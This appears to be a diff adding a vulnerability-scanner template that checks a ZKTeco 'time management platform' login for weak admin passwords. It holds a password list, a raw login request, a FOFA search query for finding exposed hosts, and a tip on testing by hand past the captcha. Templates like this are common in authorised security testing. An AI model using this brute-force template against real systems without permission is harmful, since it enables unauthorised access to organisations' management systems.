@@ -1,0 +1,43 @@
+id: e-zkeco-default-login
+
+info:
+  name: 时间精细化管理平台 - 弱口令
+  author: SleepingBag945
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: title="时间精细化管理平台"
+    tips: 目前大多数版本均存在验证码,因此当发现时可自行使用该弱口令进行测试
+  tags: iclock,default-login,zkeco
+
+http:
+  - raw:
+      - |
+        POST /iclock/accounts/login/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+
+        username=admin&password={{password}}
+
+    payloads:
+      password:
+        - admin
+        - 123456
+        - 111111
+        - 12345678
+        - 123
+        - admin123
+        - admin123456
+        - admin@123
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,"message","ret","0")
+          - contains_all(to_lower(all_headers),'set-cookie')
+        condition: and
